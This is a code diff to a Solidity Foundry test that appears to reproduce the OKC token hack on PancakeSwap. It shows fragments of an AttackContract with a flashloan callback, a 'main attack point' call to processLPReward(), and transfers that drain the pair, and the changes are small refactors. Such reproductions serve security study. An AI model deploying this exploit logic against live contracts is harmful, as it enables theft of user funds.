@@ -3,6 +3,13 @@ pragma solidity ^0.8.13;
 
 import {Test, console2} from "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IDODOCallee} from "src/interfaces/IDODOCallee.sol";
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
+import {IPancakeV3Pool} from "src/interfaces/IPancakeV3Pool.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 // @Analysis
 // https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b
 // @TX
@@ -238,7 +245,7 @@ contract AttackContract is IDODOCallee {
 
         console2.log("--- Step 3: Main attack point");
         // MinerPool.call{value: 1 wei}(""); // Attackers use this method
-        minerPool.call(abi.encodeWithSignature("processLPReward()"));
+        (bool success4,) = minerPool.call(abi.encodeWithSignature("processLPReward()"));
         console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
         //assert(225705840317082411194413 == pancakePair_USDT_OKC.balanceOf(address(attack_contract2)));
         uint256 tmp1 = attack_contract2.transfer_all(address(pancakePair_USDT_OKC), address(this));
@@ -294,20 +301,20 @@ contract AttackContract is IDODOCallee {
         return amounts[1];
     }
 
-    function calculateAddress(address creator, uint256 nonce) public pure returns (address) {
+    function calculateAddress(address creator, uint256 _nonce) public pure returns (address) {
         bytes memory data;
-        if (nonce == 0x00) {
+        if (_nonce == 0x00) {
             data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80));
-        } else if (nonce <= 0x7f) {
-            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, uint8(nonce));
-        } else if (nonce <= 0xff) {
-            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), uint8(nonce));
-        } else if (nonce <= 0xffff) {
-            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), creator, bytes1(0x82), uint16(nonce));
-        } else if (nonce <= 0xffffff) {
-            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), creator, bytes1(0x83), uint24(nonce));
+        } else if (_nonce <= 0x7f) {
+            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, uint8(_nonce));
+        } else if (_nonce <= 0xff) {
+            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), uint8(_nonce));
+        } else if (_nonce <= 0xffff) {
+            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), creator, bytes1(0x82), uint16(_nonce));
+        } else if (_nonce <= 0xffffff) {
+            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), creator, bytes1(0x83), uint24(_nonce));
         } else {
-            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(nonce));
+            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(_nonce));
         }
         return address(uint160(uint256(keccak256(data))));
     }
